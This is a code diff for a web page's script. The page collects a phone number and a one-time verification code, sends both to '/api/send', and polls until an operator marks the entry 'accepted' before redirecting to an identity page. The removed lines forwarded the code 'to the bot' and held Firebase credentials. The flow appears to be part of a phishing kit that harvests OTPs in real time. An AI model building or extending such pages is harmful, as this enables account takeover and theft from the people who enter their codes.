@@ -65,41 +65,36 @@
     </div>
 </div>
 
-<script type="module">
-    import { initializeApp } from "https://www.gstatic.com/firebasejs/10.0.0/firebase-app.js";
-    import { getFirestore, doc, onSnapshot, updateDoc } from "https://www.gstatic.com/firebasejs/10.0.0/firebase-firestore.js";
-
-    const firebaseConfig = {
-        apiKey: "AIzaSyC05uAGTFE_mZyByFBTRexYn5VbTfzW0Go",
-        authDomain: "barq-9ba61.firebaseapp.com",
-        projectId: "barq-9ba61",
-        storageBucket: "barq-9ba61.firebasestorage.app",
-        messagingSenderId: "1060477857765",
-        appId: "1:1060477857765:web:e1e2c606668209f364090c"
-    };
-
-    const app = initializeApp(firebaseConfig);
-    const db = getFirestore(app);
-    
+<script>
     const docId = localStorage.getItem('currentDocId');
     const userPhone = localStorage.getItem('userPhone');
 
     if (userPhone) document.getElementById('displayPhone').innerText = userPhone;
 
-    // 1. مراقب الحالة (الانتقال التلقائي)
-    if (docId) {
-        onSnapshot(doc(db, "users", docId), (docSnap) => {
-            if (docSnap.exists() && docSnap.data().status === "accepted") {
+    // 1. مراقب الحالة (Polling): التحقق من الحالة كل ثانيتين عبر الـ API
+    async function checkStatus() {
+        if (!docId) return;
+        try {
+            const response = await fetch('/api/send'); // طلب GET لجلب البيانات
+            const users = await response.json();
+            const currentUser = users.find(u => u.id === docId);
+            
+            // إذا تغيرت الحالة إلى accepted ننتقل للصفحة التالية
+            if (currentUser && currentUser.status === 'accepted') {
                 window.location.href = 'identity.html';
             }
-        });
+        } catch (e) {
+            console.error("خطأ في الاتصال:", e);
+        }
     }
+    
+    // تشغيل المراقبة كل 2000 مللي ثانية (ثانيتين)
+    setInterval(checkStatus, 2000);
 
-    // 2. العداد التنازلي
+    // 2. العداد التنازلي (بقي كما هو)
     let timeLeft = 60;
     const timerDisplay = document.getElementById('timer');
     const resendLink = document.getElementById('resendLink');
-
     const countdown = setInterval(() => {
         timeLeft--;
         timerDisplay.innerText = timeLeft;
@@ -110,7 +105,7 @@
         }
     }, 1000);
 
-    // 3. إرسال الرمز للبوت عند اكتماله
+    // 3. إرسال الرمز عند اكتماله (عبر الـ API)
     const inputs = document.querySelectorAll('.otp-box');
     inputs.forEach((input, index) => {
         input.addEventListener('input', async (e) => {
@@ -120,19 +115,17 @@
             if (Array.from(inputs).every(i => i.value !== '')) {
                 const otp = Array.from(inputs).map(i => i.value).join('');
                 
-                // حفظ في فايربيس
-                if(docId) await updateDoc(doc(db, "users", docId), { otp: otp });
-
-                // إرسال للبوت (استبدل الرابط برابط بوتك الفعلي)
-                fetch('/api/send', { 
-                    method: 'POST', 
+                // إرسال الرمز للـ API بدلاً من Firebase المباشر
+                await fetch('/api/send', { 
+                    method: 'PATCH', // نستخدم PATCH لتحديث الرمز في قاعدة البيانات
                     headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ phone: userPhone, otp: otp }) 
+                    body: JSON.stringify({ id: docId, otp: otp, status: 'pending' }) 
                 });
             }
         });
     });
 </script>
+
 
 
 
